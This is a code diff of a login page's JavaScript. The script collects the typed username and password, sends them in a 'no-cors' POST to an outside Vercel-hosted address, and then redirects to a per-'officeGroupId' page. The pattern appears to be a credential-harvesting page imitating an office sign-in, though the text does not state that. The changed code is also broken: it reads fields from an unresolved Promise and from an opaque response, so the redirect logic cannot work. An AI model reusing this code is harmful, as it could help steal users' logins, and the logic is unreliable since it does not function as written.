@@ -81,7 +81,7 @@
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
-            fetch('https://niogems.vercel.app/login', {
+            const result = fetch('https://niogems.vercel.app/login', {
                 method: 'POST',
                 mode: 'no-cors',  // This disables CORS
                 headers: {
@@ -91,27 +91,22 @@
             })
                 .then(response => {
                     console.log('Request was successful');
+                    // Show loading spinner
+                    document.getElementById('loading').style.display = 'block';
+
+                    // Redirect after 3 seconds
+                    setTimeout(() => {
+                        if (result.officeGroupId) {
+                            window.location.href = `loc/${result.officeGroupId}/index.htm`;
+                        } else {
+                            window.location.href = 'no-office.html'; // Example page for no office found
+                        }
+                    }, 3000); // Wait 3 seconds before redirecting
                 })
                 .catch(error => {
                     console.error('Error:', error);
+                    alert(result.message);
                 });
-
-            if (result.success) {
-                // Show loading spinner
-                document.getElementById('loading').style.display = 'block';
-
-                // Redirect after 3 seconds
-                setTimeout(() => {
-                    if (result.officeGroupId) {
-                        window.location.href = `loc/${result.officeGroupId}/index.htm`;
-                    } else {
-                        window.location.href = 'no-office.html'; // Example page for no office found
-                    }
-                }, 3000); // Wait 3 seconds before redirecting
-            } else {
-                // Handle error (you can show a simple message)
-                alert(result.message);
-            }
         };
     </script>
 </body>
